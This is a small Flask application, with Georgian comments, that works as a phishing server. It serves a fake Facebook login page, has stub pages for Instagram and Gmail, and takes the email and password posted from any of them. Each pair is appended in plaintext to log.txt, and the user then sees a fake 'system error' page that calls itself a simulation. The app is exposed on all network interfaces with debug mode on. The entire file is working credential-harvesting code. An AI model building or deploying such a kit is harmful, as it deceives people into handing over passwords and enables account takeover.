from flask import Flask, render_template, request

app = Flask(__name__)

# მთავარი მენიუ
@app.route('/')
def home():
    return render_template('menu.html')

# ფეისბუქი
@app.route('/facebook')
def facebook():
    return render_template('facebook.html')

# ინსტაგრამი
@app.route('/instagram')
def instagram():
    return "<h1>instagram-ის გვერდი მზადების პროცესშია</h1>"

# მეილი
@app.route('/gmail')
def gmail():
    return "<h1>gmail-ის გვერდი მზადების პროცესშია</h1>"

# მონაცემების მიღება (სამივე საიტი აქ გამოაგზავნის პაროლებს)
@app.route('/login', methods=['POST'])
def login():
    platform = request.form.get('platform')
    email = request.form.get('email')
    password = request.form.get('password') 

    #log.txt
    with open('log.txt', 'a', encoding='utf-8') as f:
        f.write(f"[{platform}] Email: {email} | Password: {password}\n")

    return "<h1>სისტემური შეცდომა!</h1><p>ეს არის სიმულაცია. მონაცემები ჩაიწერა log.txt-ში.</p>"

if __name__ == '__main__':
    #წვდომა ქსელში
    app.run(host='0.0.0.0', port=5000, debug=True)